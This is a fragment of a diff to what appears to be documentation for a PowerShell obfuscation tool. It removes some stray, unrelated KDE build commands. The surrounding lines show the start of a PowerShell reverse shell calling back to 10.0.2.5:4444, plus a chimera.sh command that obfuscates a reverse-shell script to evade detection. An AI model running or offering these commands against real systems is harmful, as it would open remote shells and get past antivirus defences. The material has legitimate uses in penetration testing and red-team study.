@@ -157,9 +157,4 @@ $client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $cl
 
 ```bash
  /opt/chimera.sh -f /opt/shells/reverse.ps1 -o /tmp/chimera.ps1 -l 4 -v -c -i -j -g -r -p -b new-object,out-string
-    git clone git@invent.kde.org:frameworks/syntax-highlighting.git
-   mkdir ./syntax-highlighting/build
-   cd ./syntax-highlighting/build
-   cmake ../
-   make
  ```
